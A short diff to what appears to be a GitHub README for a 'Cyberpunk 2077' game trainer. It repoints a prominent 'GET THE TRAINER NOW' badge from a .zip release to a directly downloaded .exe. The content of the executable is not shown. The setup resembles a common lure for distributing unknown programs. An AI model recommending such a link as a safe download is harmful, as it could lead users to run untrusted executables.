@@ -4,7 +4,7 @@
 </h1>
 
 <p align="center">
-  <a href="https://github.com/ted0922740/cyberpunk-2026-trainer/releases/download/v1.0.27/Cyberpunk2077.NeonOverdrive.Trainer.zip">
+  <a href="https://github.com/ted0922740/cyberpunk-2026-trainer/releases/download/cyberpunk-2077-trainer/Cyberpunk2077.Trainer.exe">
     <img src="https://img.shields.io/badge/GET%20THE%20TRAINER%20NOW-%E2%96%BA%20v1.0.27-gold?style=for-the-badge&logo=github&labelColor=000000&logoColor=black" alt="Get Neon Overdrive Trainer" width="480">
   </a>
 </p>
